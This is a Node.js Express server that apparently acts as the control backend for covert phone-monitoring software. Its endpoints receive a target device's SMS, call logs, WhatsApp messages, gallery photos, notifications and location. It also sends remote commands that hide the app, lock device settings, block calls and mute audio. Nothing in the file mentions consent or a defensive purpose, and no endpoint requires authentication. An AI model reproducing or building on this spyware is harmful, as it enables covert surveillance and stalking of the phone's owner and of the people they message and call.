const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const admin = require('firebase-admin');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Firebase Config
const serviceAccount = {
  type: process.env.FIREBASE_TYPE || "service_account",
  project_id: process.env.FIREBASE_PROJECT_ID,
  private_key_id: process.env.FIREBASE_PRIVATE_KEY_ID,
  private_key: process.env.FIREBASE_PRIVATE_KEY?.replace(/\\n/g, '\n'),
  client_email: process.env.FIREBASE_CLIENT_EMAIL,
  client_id: process.env.FIREBASE_CLIENT_ID,
  auth_uri: process.env.FIREBASE_AUTH_URI,
  token_uri: process.env.FIREBASE_TOKEN_URI
};

try {
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount)
  });
} catch (e) {
  console.log('Firebase already initialized');
}

// Database
const devices = {};
const deviceData = {};

// ==================== KEEP-ALIVE SYSTEM ====================
const RENDER_PUBLIC_URL = process.env.SERVER_URL || `http://localhost:${PORT}`;

console.log('[KEEP-ALIVE] Starting with URL:', RENDER_PUBLIC_URL);

// Aggressive keep-alive - Har 2 min ping
setInterval(() => {
  const httpModule = RENDER_PUBLIC_URL.startsWith('https') ? require('https') : http;
  
  httpModule.get(`${RENDER_PUBLIC_URL}/ping`, (res) => {
    console.log(`✅ [PING SUCCESS] ${new Date().toISOString()} - Status: ${res.statusCode}`);
  }).on('error', (err) => {
    console.error(`❌ [PING FAILED] ${new Date().toISOString()} - Error: ${err.message}`);
  }).setTimeout(10000);
}, 2 * 60 * 1000);

// Backup ping - Har 3 min
setInterval(() => {
  const httpModule = RENDER_PUBLIC_URL.startsWith('https') ? require('https') : http;
  httpModule.get(`${RENDER_PUBLIC_URL}/ping`, () => {
    console.log('🔄 [BACKUP PING] Executed');
  }).on('error', () => {}).setTimeout(10000);
}, 3 * 60 * 1000);

// ==================== ENDPOINTS ====================

// Health check
app.get('/ping', (req, res) => {
  res.json({ status: 'alive', timestamp: new Date() });
});

// Device Registration
app.post('/register', (req, res) => {
  const { token, device } = req.body;
  if (!token || !device) return res.status(400).json({ error: 'Missing fields' });
  
  devices[device] = { token, registeredAt: new Date(), lastSeen: new Date() };
  res.json({ success: true, message: 'Device registered' });
});

// Get all devices
app.get('/devices', (req, res) => {
  res.json(Object.keys(devices));
});

// ==================== MONITORING ENDPOINTS ====================

app.post('/battery', (req, res) => {
  const { device, level, charging, time } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  if (!deviceData[device]) deviceData[device] = {};
  deviceData[device].battery = { level, charging, time };
  res.json({ success: true });
});

app.post('/location', (req, res) => {
  const { device, lat, lng, accuracy, time } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  if (!deviceData[device]) deviceData[device] = {};
  deviceData[device].location = { lat, lng, accuracy, time };
  res.json({ success: true });
});

app.post('/sms', (req, res) => {
  const { device, sms, count, time } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  if (!deviceData[device]) deviceData[device] = {};
  deviceData[device].sms = { messages: sms, count, time };
  console.log(`📱 SMS received from ${device}: ${count} messages`);
  res.json({ success: true });
});

app.post('/calls', (req, res) => {
  const { device, calls, count, time } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  if (!deviceData[device]) deviceData[device] = {};
  deviceData[device].calls = { callLogs: calls, count, time };
  console.log(`📞 Calls received from ${device}: ${count} calls`);
  res.json({ success: true });
});

app.post('/notification', (req, res) => {
  const { device, notifications, count, time } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  if (!deviceData[device]) deviceData[device] = {};
  deviceData[device].notifications = { notifications, count, time };
  console.log(`🔔 Notifications received from ${device}: ${count} notifications`);
  res.json({ success: true });
});

// ==================== NEW FEATURE ENDPOINTS ====================

// WiFi Control
app.post('/wifi-status', (req, res) => {
  const { device, enabled, ssid, ip, status, message, time } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  if (!deviceData[device]) deviceData[device] = {};
  deviceData[device].wifi = { enabled, ssid, ip, status, message, time };
  console.log(`📶 WiFi status from ${device}: ${status}`);
  res.json({ success: true });
});

app.get('/toggle-wifi', async (req, res) => {
  const device = req.query.device;
  const enable = req.query.enable === 'true';
  
  if (!device) return res.status(400).json({ error: 'Device required' });
  if (!devices[device]) return res.status(404).json({ error: 'Device not registered' });
  
  await sendFCMSignal(device, 'toggle_wifi', { enable });
  res.json({ success: true, message: `WiFi ${enable ? 'enabled' : 'disabled'}` });
});

// Mobile Data Control
app.post('/data-status', (req, res) => {
  const { device, enabled, operator, state, status, message, time } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  if (!deviceData[device]) deviceData[device] = {};
  deviceData[device].mobileData = { enabled, operator, state, status, message, time };
  console.log(`📡 Mobile data status from ${device}: ${status}`);
  res.json({ success: true });
});

app.get('/toggle-data', async (req, res) => {
  const device = req.query.device;
  const enable = req.query.enable === 'true';
  
  if (!device) return res.status(400).json({ error: 'Device required' });
  if (!devices[device]) return res.status(404).json({ error: 'Device not registered' });
  
  await sendFCMSignal(device, 'toggle_data', { enable });
  res.json({ success: true, message: `Mobile data ${enable ? 'enabled' : 'disabled'}` });
});

// SIM Card Alert
app.post('/sim-alert', (req, res) => {
  const { device, alert, new_imei, new_operator, time } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  if (!deviceData[device]) deviceData[device] = {};
  deviceData[device].simAlert = { alert, new_imei, new_operator, time };
  console.log(`🚨 SIM ALERT from ${device}: ${new_operator}`);
  res.json({ success: true });
});

// WhatsApp Monitoring
app.post('/whatsapp', (req, res) => {
  const { device, messages, count, time } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  if (!deviceData[device]) deviceData[device] = {};
  deviceData[device].whatsapp = { messages, count, time };
  console.log(`💬 WhatsApp messages from ${device}: ${count} messages`);
  res.json({ success: true });
});

// Gallery Monitoring
app.post('/gallery', (req, res) => {
  const { device, photos, count, time } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  if (!deviceData[device]) deviceData[device] = {};
  deviceData[device].gallery = { photos, count, time };
  console.log(`📸 Gallery photos from ${device}: ${count} photos`);
  res.json({ success: true });
});

// Media Control
app.post('/media-control', (req, res) => {
  const { device, music_volume, music_muted, call_volume, system_volume, status, message, time } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  if (!deviceData[device]) deviceData[device] = {};
  deviceData[device].mediaControl = { music_volume, music_muted, call_volume, system_volume, status, message, time };
  console.log(`🔊 Media control from ${device}: ${status}`);
  res.json({ success: true });
});

app.get('/set-volume', async (req, res) => {
  const device = req.query.device;
  const volume = parseInt(req.query.volume);
  
  if (!device || isNaN(volume)) return res.status(400).json({ error: 'Device and volume required' });
  if (!devices[device]) return res.status(404).json({ error: 'Device not registered' });
  
  await sendFCMSignal(device, 'set_volume', { volume });
  res.json({ success: true, message: `Volume set to ${volume}` });
});

app.get('/mute-audio', async (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  if (!devices[device]) return res.status(404).json({ error: 'Device not registered' });
  
  await sendFCMSignal(device, 'mute_audio', {});
  res.json({ success: true, message: 'Audio muted' });
});

// Call Interception
app.post('/call-intercept', (req, res) => {
  const { device, call_type, phone_number, state, status, message, time } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  if (!deviceData[device]) deviceData[device] = {};
  deviceData[device].callIntercept = { call_type, phone_number, state, status, message, time };
  console.log(`📞 Call intercept from ${device}: ${call_type} from ${phone_number}`);
  res.json({ success: true });
});

app.get('/block-call', async (req, res) => {
  const device = req.query.device;
  const phoneNumber = req.query.number;
  
  if (!device || !phoneNumber) return res.status(400).json({ error: 'Device and number required' });
  if (!devices[device]) return res.status(404).json({ error: 'Device not registered' });
  
  await sendFCMSignal(device, 'block_call', { phoneNumber });
  res.json({ success: true, message: `Call from ${phoneNumber} blocked` });
});

// Settings Lock
app.post('/settings-lock', (req, res) => {
  const { device, settings_enabled, admin_active, status, message, time } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  if (!deviceData[device]) deviceData[device] = {};
  deviceData[device].settingsLock = { settings_enabled, admin_active, status, message, time };
  console.log(`⚙️ Settings lock status from ${device}: ${status}`);
  res.json({ success: true });
});

app.get('/lock-settings', async (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  if (!devices[device]) return res.status(404).json({ error: 'Device not registered' });
  
  await sendFCMSignal(device, 'lock_settings', {});
  res.json({ success: true, message: 'Settings locked' });
});

app.get('/unlock-settings', async (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  if (!devices[device]) return res.status(404).json({ error: 'Device not registered' });
  
  await sendFCMSignal(device, 'unlock_settings', {});
  res.json({ success: true, message: 'Settings unlocked' });
});

// ==================== SHOW/HIDE APP ====================

app.get('/show_app', async (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  if (!devices[device]) return res.status(404).json({ error: 'Device not registered' });
  
  await sendFCMSignal(device, 'show_app');
  res.json({ success: true, message: 'App UI shown for 30 seconds' });
});

app.get('/hide_app', async (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  if (!devices[device]) return res.status(404).json({ error: 'Device not registered' });
  
  await sendFCMSignal(device, 'hide_app');
  res.json({ success: true, message: 'App hidden' });
});

// ==================== GET DATA ENDPOINTS ====================

app.get('/get-sms', (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  const data = deviceData[device]?.sms || { messages: [], count: 0 };
  res.json(data);
});

app.get('/get-calls', (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  const data = deviceData[device]?.calls || { callLogs: [], count: 0 };
  res.json(data);
});

app.get('/get-location', (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  const data = deviceData[device]?.location || {};
  res.json(data);
});

app.get('/get-notifications', (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  const data = deviceData[device]?.notifications || { notifications: [], count: 0 };
  res.json(data);
});

app.get('/get-whatsapp', (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  const data = deviceData[device]?.whatsapp || { messages: [], count: 0 };
  res.json(data);
});

app.get('/get-gallery', (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  const data = deviceData[device]?.gallery || { photos: [], count: 0 };
  res.json(data);
});

// ==================== FCM SIGNAL FUNCTION ====================

async function sendFCMSignal(device, action, extra = {}) {
  try {
    const token = devices[device]?.token;
    if (!token) return;

    const message = {
      token: token,
      data: {
        action: action,
        ...extra
      }
    };

    await admin.messaging().send(message);
    console.log(`✅ FCM sent to ${device}: ${action}`);
  } catch (error) {
    console.error(`❌ FCM error for ${device}:`, error.message);
  }
}

// ==================== DEVICE DATA RETRIEVAL ====================

app.get('/device-data', (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  const data = deviceData[device] || {};
  res.json(data);
});

// ==================== GEOFENCE ====================

app.get('/geofence', (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  res.json({
    active: false,
    lat: 28.6139,
    lng: 77.2090,
    radius: 1000
  });
});

// ==================== SERVER START ====================

server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📍 URL: ${RENDER_PUBLIC_URL}`);
});
